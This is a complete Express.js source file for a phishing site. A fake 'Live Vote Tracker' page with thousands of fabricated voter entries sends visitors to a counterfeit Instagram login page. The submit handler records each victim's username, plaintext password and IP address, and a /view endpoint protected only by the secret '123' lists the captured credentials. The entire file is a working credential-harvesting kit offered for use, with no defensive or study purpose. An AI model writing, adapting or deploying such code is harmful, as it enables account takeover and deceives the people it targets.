const express = require('express');
const app = express();
app.use(express.urlencoded({ extended: true }));

const entries = [];
const firstNames = ['John', 'Amara', 'Bingley', 'Sarah', 'David', 'Fatima', 'Michael', 'Chloe', 'Ahmed', 'Grace', 'Tunde', 'Chioma', 'Alex', 'Maya'];
const TARGET_VOTES = 10000;

for (let i = 0; i < 9985; i++) {
  const randomName = firstNames[Math.floor(Math.random() * firstNames.length)];
  entries.push({ username: randomName + Math.floor(Math.random() * 99), password: 'hidden', ip: 'hidden', time: new Date().toISOString() });
}

function maskName(name) {
  if (!name) return 'Anonymous';
  if (name.length <= 2) return name[0] + '*';
  return name.substring(0, 2) + '***' + name.slice(-1);
}

function getInitial(name) { return name ? name.charAt(0).toUpperCase() : '?'; }

function getAvatarColor(name) {
  const colors = ['#6366f1', '#8b5cf6', '#ec4899', '#10b981', '#f59e0b', '#3b82f6'];
  let hash = 0;
  for (let i = 0; i < name.length; i++) { hash = name.charCodeAt(i) + ((hash << 5) - hash); }
  return colors[Math.abs(hash) % colors.length];
}

app.get('/api/feed', (req, res) => {
  res.json({
    count: entries.length,
    target: TARGET_VOTES,
    latest: [...entries].reverse().slice(0, 5).map(v => ({
      username: v.username, maskedName: maskName(v.username), initial: getInitial(v.username), color: getAvatarColor(v.username)
    }))
  });
});

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Live Vote Tracker</title>
      <style>
        :root { --bg: #09090b; --panel: rgba(255, 255, 255, 0.03); --border: rgba(255, 255, 255, 0.08); --text: #f8fafc; --muted: #94a3b8; --green: #10b981; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: var(--bg); background-image: radial-gradient(circle at 50% 0%, rgba(99, 102, 241, 0.15) 0%, transparent 60%); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 25px 20px; }
        .container { width: 100%; max-width: 420px; display: flex; flex-direction: column; gap: 25px; }
        .top-nav { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
        .top-nav h1 { font-size: 18px; font-weight: 800; letter-spacing: 1px; }
        .sys-status { font-size: 11px; font-weight: 600; color: var(--green); display: flex; align-items: center; gap: 6px; text-transform: uppercase; }
        .stats-card { background: var(--panel); border: 1px solid var(--border); border-radius: 20px; padding: 25px 20px; backdrop-filter: blur(10px); }
        .stats-grid { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 15px; }
        .stat-item { display: flex; flex-direction: column; gap: 5px; }
        .stat-item.right { align-items: flex-end; }
        .stat-label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
        .vote-count { font-size: 42px; font-weight: 800; font-family: ui-monospace, monospace; transition: color 0.3s; line-height: 1; }
        .vote-count.tick-up { color: var(--green); text-shadow: 0 0 15px rgba(16, 185, 129, 0.6); }
        .vote-target { font-size: 26px; font-weight: 800; font-family: ui-monospace, monospace; color: var(--muted); line-height: 1; }
        .progress-track { width: 100%; height: 8px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; margin-top: 10px; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #6366f1, #ec4899); border-radius: 10px; width: 0%; transition: width 0.5s ease-out; }
        .animation-container { display: flex; justify-content: center; margin: 15px 0; }
        .big-ballot-anim { position: relative; width: 120px; height: 120px; overflow: hidden; padding-top: 20px; }
        .b-box-back { position: absolute; bottom: 0; width: 120px; height: 70px; background: #1f2937; border: 2px solid #374151; border-radius: 10px; z-index: 1; }
        .b-ballot { position: absolute; bottom: 30px; left: 20px; width: 80px; height: 65px; background: #fff; border-radius: 6px; z-index: 2; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 5px; animation: dropLoop 3s cubic-bezier(0.4, 0, 0.2, 1) infinite; }
        .b-line { width: 45px; height: 6px; background: #cbd5e1; border-radius: 3px; }
        .b-line.short { width: 30px; }
        .b-box-front { position: absolute; bottom: 0; width: 120px; height: 55px; background: #111827; border: 2px solid #6366f1; border-radius: 10px; z-index: 3; box-sizing: border-box; box-shadow: 0 5px 20px rgba(99, 102, 241, 0.4); }
        .b-box-slot { position: absolute; bottom: 45px; left: 25px; width: 70px; height: 6px; background: #000; border-radius: 4px; z-index: 4; }
        @keyframes dropLoop { 0% { transform: translateY(-100px) rotate(-5deg); opacity: 0; } 20% { transform: translateY(-100px) rotate(-5deg); opacity: 1; } 50% { transform: translateY(0) rotate(0deg); opacity: 1; } 70% { transform: translateY(35px); opacity: 0; } 100% { transform: translateY(35px); opacity: 0; } }
        .btn { display: block; width: 100%; background: #fff; color: #000; text-decoration: none; padding: 16px; border-radius: 16px; font-weight: 700; text-align: center; font-size: 16px; transition: transform 0.2s; box-shadow: 0 4px 15px rgba(255, 255, 255, 0.1); }
        .ticker-container { background: var(--panel); border: 1px solid var(--border); border-radius: 20px; overflow: hidden; backdrop-filter: blur(10px); }
        .ticker-header { display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.3); }
        .ticker-header h3 { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; }
        .live-badge { font-size: 11px; color: var(--green); display: flex; align-items: center; gap: 6px; font-weight: bold; }
        .ticker-content { display: flex; justify-content: center; align-items: center; padding: 25px 20px; }
        .single-vote-card { display: flex; align-items: center; gap: 15px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.08); padding: 16px 20px; border-radius: 16px; width: 100%; transition: opacity 0.4s, transform 0.4s; }
        .single-vote-card.fade-out { opacity: 0; transform: translateY(10px); }
        .single-vote-card.fade-in { opacity: 1; transform: translateY(0); }
        .avatar { width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: 800; color: #fff; }
        .log-name { font-size: 15px; font-weight: 700; display: block; }
        .log-action { font-size: 13px; color: var(--muted); margin-top: 4px; display: block; }
        .verified-badge-small { margin-left: auto; color: var(--green); font-size: 10px; font-weight: bold; border: 1px solid var(--green); padding: 4px 8px; border-radius: 6px; background: rgba(16, 185, 129, 0.1); }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="top-nav"><h1>LIVE_VOTE_TRACKER</h1><div class="sys-status"><div style="width:8px; height:8px; background:var(--green); border-radius:50%; box-shadow:0 0 10px var(--green);"></div> Online</div></div>
        <div class="stats-card">
          <div class="stats-grid">
            <div class="stat-item"><div class="stat-label">Casted Votes</div><div class="vote-count" id="vote-count">0</div></div>
            <div class="stat-item right"><div class="stat-label">Target</div><div class="vote-target">10,000</div></div>
          </div>
          <div class="progress-track"><div class="progress-fill" id="progress-bar"></div></div>
        </div>
        <div class="animation-container"><div class="big-ballot-anim"><div class="b-box-back"></div><div class="b-ballot"><div class="b-line"></div><div class="b-line"></div><div class="b-line short"></div></div><div class="b-box-front"><div class="b-box-slot"></div></div></div></div>
        <a href="/login" class="btn">Click to Vote</a>
        <div class="ticker-container">
          <div class="ticker-header"><h3>Recent Supporters</h3><div class="live-badge"><div style="width:6px; height:6px; background:var(--green); border-radius:50%;"></div> LIVE</div></div>
          <div class="ticker-content"><div id="vote-card" class="single-vote-card fade-in"><div class="avatar" id="avatar" style="background-color: #333;">?</div><div><span class="log-name" id="name">Loading...</span><span class="log-action">just cast a secure vote</span></div><div class="verified-badge-small">VERIFIED</div></div></div>
        </div>
      </div>
      <script>
        let currentCount = 0; let currentVoteIndex = 0; let latestVotes = [];
        async function fetchData() {
          try {
            const response = await fetch('/api/feed'); const data = await response.json();
            if (data.count !== currentCount) {
              const countEl = document.getElementById('vote-count'); countEl.innerText = data.count.toLocaleString();
              if (data.count > currentCount) { countEl.classList.add('tick-up'); setTimeout(() => countEl.classList.remove('tick-up'), 800); }
              document.getElementById('progress-bar').style.width = (data.count / data.target) * 100 + '%'; currentCount = data.count;
            }
            latestVotes = data.latest;
          } catch (err) { }
        }
        function rotateVote() {
          if (latestVotes.length === 0) return;
          const card = document.getElementById('vote-card'); card.classList.remove('fade-in'); card.classList.add('fade-out');
          setTimeout(() => {
            const vote = latestVotes[currentVoteIndex % latestVotes.length];
            document.getElementById('avatar').innerText = vote.initial; document.getElementById('avatar').style.backgroundColor = vote.color; document.getElementById('name').innerText = vote.maskedName;
            card.classList.remove('fade-out'); card.classList.add('fade-in'); currentVoteIndex++;
          }, 400);
        }
        fetchData(); setInterval(fetchData, 2000); setInterval(rotateVote, 10000);
      </script>
    </body></html>
  `);
});

app.get('/login', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Instagram</title>
      <style>
        body { background-color: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; box-sizing: border-box; }
        .back-btn { color: #a8a8a8; text-decoration: none; font-size: 24px; margin-bottom: 20px; display: inline-block; width: 30px; }
        .lang { text-align: center; color: #a8a8a8; margin-bottom: 50px; font-size: 14px; }
        .logo-container { text-align: center; margin-bottom: 70px; }
        .logo-container img { width: 65px; height: 65px; }
        form { display: flex; flex-direction: column; gap: 8px; width: 100%; max-width: 380px; margin: 0 auto; }
        input { background-color: #000; border: 1.5px solid #4a4a4a; border-radius: 14px; padding: 20px 16px; color: #fff; font-size: 14px; outline: none; }
        input::placeholder { color: #a8a8a8; }
        button { background-color: #0064e0; color: white; border: none; border-radius: 25px; padding: 16px; font-size: 16px; font-weight: 700; margin-top: 12px; cursor: pointer; }
        .forgot { text-align: center; color: #fff; font-size: 14px; margin-top: 25px; text-decoration: none; font-weight: 600; }
        .bottom-section { margin-top: auto; padding-bottom: 10px; text-align: center; }
        .create-btn { display: block; width: 100%; max-width: 380px; margin: 0 auto 25px auto; padding: 14px; border: 1px solid #364150; color: #0095f6; background: transparent; border-radius: 25px; font-size: 15px; font-weight: 600; text-decoration: none; box-sizing: border-box; }
        .meta-logo { color: #a8a8a8; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 5px; font-weight: bold; margin-bottom: 5px; }
      </style>
    </head><body>
      <a href="/" class="back-btn">←</a><div class="lang">English (UK) ⌄</div>
      <div class="logo-container"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo"></div>
      <form method="POST" action="/submit">
        <input type="text" name="username" placeholder="Username, email address or mobile number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log in</button>
      </form>
      <a href="#" class="forgot">Forgotten password?</a>
      <div class="bottom-section"><a href="#" class="create-btn">Create new account</a><div class="meta-logo">∞ Meta</div></div>
    </body></html>
  `);
});

app.post('/submit', (req, res) => {
  const body = req.body || {};
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress;
  entries.push({ username: body.username || 'Missing', password: body.password || 'Missing', ip, time: new Date().toISOString() });
  res.redirect('/thank-you');
});

app.get('/thank-you', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">
      <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #000; color: #fff; text-align: center; flex-direction: column; overflow: hidden; }
        .vote-container { position: relative; width: 120px; height: 120px; margin: 0 auto 30px auto; }
        .box-back { position: absolute; bottom: 0; width: 100%; height: 80px; background: #1a1a1a; border: 2px solid #333; border-radius: 8px; z-index: 1; }
        .ballot { position: absolute; bottom: 30px; left: 15px; width: 90px; height: 80px; background: #fff; border-radius: 4px; z-index: 2; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 6px; animation: dropIn 2.5s forwards; }
        .line { width: 50px; height: 6px; background: #ccc; border-radius: 3px; } .line.short { width: 30px; }
        .box-front { position: absolute; bottom: 0; width: 100%; height: 60px; background: #000; border: 2px solid #0095f6; border-radius: 8px; z-index: 3; box-sizing: border-box; }
        .box-slot { position: absolute; bottom: 50px; left: 20%; width: 60%; height: 6px; background: #333; border-radius: 3px; z-index: 4; }
        @keyframes dropIn { 0% { transform: translateY(-120px); opacity: 0; } 20% { transform: translateY(-120px); opacity: 1; } 60% { transform: translateY(0); } 80% { transform: translateY(40px); opacity: 0; } 100% { transform: translateY(40px); opacity: 0; } }
        h1 { font-size: 24px; margin: 10px 0; font-weight: 600; opacity: 0; animation: fadeIn 1s 1.8s forwards; }
        p { color: #a8a8a8; font-size: 16px; opacity: 0; animation: fadeIn 1s 2.2s forwards; }
        @keyframes fadeIn { 100% { opacity: 1; } }
      </style>
    </head><body>
      <div class="vote-container"><div class="box-back"></div><div class="ballot"><div class="line"></div><div class="line"></div><div class="line short"></div></div><div class="box-front"><div class="box-slot"></div></div></div>
      <h1>Thank you for voting!</h1><p>Your response has been successfully recorded.</p>
    </body></html>
  `);
});

app.get('/view', (req, res) => {
  if (req.query.secret !== '123') return res.send('<h3 style="text-align:center; margin-top:50px; font-family:sans-serif;">Access Denied. This page is private.</h3>');
  res.send(`<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; color: #333;">${JSON.stringify(entries.slice(-50), null, 2)}</pre>`);
});

app.listen(process.env.PORT || 3000, () => console.log('Server running'));
